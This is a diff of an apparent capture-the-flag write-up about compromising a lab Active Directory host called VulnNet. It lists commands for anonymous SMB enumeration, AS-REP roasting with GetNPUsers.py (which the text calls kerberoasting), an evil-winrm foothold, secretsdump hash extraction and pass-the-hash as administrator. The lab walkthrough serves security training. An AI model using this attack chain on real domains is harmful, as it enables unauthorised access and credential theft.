@@ -71,7 +71,7 @@ we can enumerate shares anonymously providing a null password using smbmap
         VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
 ```
 
-There are read-only access to three shares (IPC$, VulnNet-Business-Anonymous, and VulnNet-Enterprise-Anonymous).
+There is read-only access to three shares (IPC$, VulnNet-Business-Anonymous, and VulnNet-Enterprise-Anonymous).
 The IPC$ share hints us of the possibility to do anonymous user enumeration. We will come to that later. Let's access the last two shares and see what contents they have
 
 ```python
@@ -99,7 +99,7 @@ smb: \> ls
   Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021
 ```
 ##
-Download all the contents onto our local machine
+Download all the text files onto our local machine
 ```
 smb: \> mget *
 ```
@@ -125,7 +125,7 @@ j-goldenhand
 j-leet
 ```
 ##
-Try kerberoasting with the username file returns a hash for t-skid (Implies user t-skid does not require kerberos pre-authentication)
+Kerberoasting with the username file returns a hash for t-skid (Implies user t-skid does not require kerberos pre-authentication)
 
 ```python
 python3 GetNPUsers.py -dc-ip 10.10.176.144 -usersfile users.txt vulnnet-rst.local/
@@ -143,8 +143,8 @@ Creds for t-skid
 user: t-skid
 pass: <redacted>
 ```
-
-Try to access smb again with the new creds to see if we can elevate our access to some shares
+##
+Try to access smb again with t-skid's creds to see if we can elevate our access to some shares
 ```python
 smbmap -H vulnet.thm -u t-skid -p '<redacted>'
 ```
@@ -157,7 +157,7 @@ smbclient //vulnet.thm/NETLOGON -U t-skid
 ```
 ![image](https://user-images.githubusercontent.com/68066436/118690902-82c89580-b7d6-11eb-95f2-9fb1715a6c6b.png)
 
-##
+
 We get a new username and password after downloading and reading the content of ResetPassword.vbs
 ![image](https://user-images.githubusercontent.com/68066436/118691117-bf948c80-b7d6-11eb-9360-202d1f66c064.png)
 
@@ -166,7 +166,7 @@ Creds for a-whitehat
 user: a-whitehat
 pass: <redacted>
 ```
-
+##
 Pass a-whitehat's creds into evil-winrm to get the initial foothold into the machine
 ```python
 evil-winrm -i vulnet.thm -u a-whitehat -p <redacted>
@@ -186,7 +186,7 @@ python3 secretsdump.py -just-dc a-whitehat:<redacted password>@vulnnet-rst.local
 ```
 ![image](https://user-images.githubusercontent.com/68066436/118694206-d2f52700-b7d9-11eb-9b00-698568e0e87f.png)
 
-What do we do now that we have the administrator's hashes? Erhmmm, let's pass-the-hash using evil-winrm
+What do we do with the administrator's hashes? Erhmmm, let's pass-the-hash using evil-winrm
 ```python
 evil-winrm -i vulnet.thm -u administrator -H <redacted NTLM hash of administrator>
 ```
